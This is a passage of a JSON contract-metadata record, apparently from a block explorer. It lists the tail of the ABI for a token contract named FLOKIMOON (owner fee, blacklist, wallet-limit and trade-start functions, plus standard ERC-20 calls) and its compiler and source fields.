uts\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"secFundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"setBuyFundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"dividendFee\",\"type\":\"uint256\"}],\"name\":\"setBuyLPDividendFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setHolderRewardCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"max\",\"type\":\"uint256\"}],\"name\":\"setMaxTxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"max\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setSecFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"setSellFundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"dividendFee\",\"type\":\"uint256\"}],\"name\":\"setSellLPDividendFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lpFee\",\"type\":\"uint256\"}],\"name\":\"setSellLPFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startAddLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startAddLPBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "FLOKIMOON", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://1aaab3ed8c31454418953b101dae34af2451dfce0edf8d44c61203ac525541e5"}